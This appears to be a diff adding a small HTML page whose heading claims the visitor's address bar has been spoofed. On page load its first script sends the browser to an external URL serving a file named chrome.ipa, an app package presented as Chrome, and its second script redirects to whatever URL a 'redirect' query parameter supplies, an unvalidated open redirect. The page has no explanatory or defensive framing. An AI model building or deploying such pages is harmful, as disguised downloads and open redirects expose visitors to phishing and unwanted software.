@@ -1,0 +1,16 @@
+<h1>you're address bar has been spoofed</h1>
+<body style="background-color: white; font-family: sans-serif;"></body>
+
+<script>
+    location.href = "https://ybt01.github.io/upload/chrome.ipa"
+</script>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const redirectUrl = params.get("redirect");
+
+  if (redirectUrl) {
+    window.location.href = redirectUrl;
+  }
+</script>
+
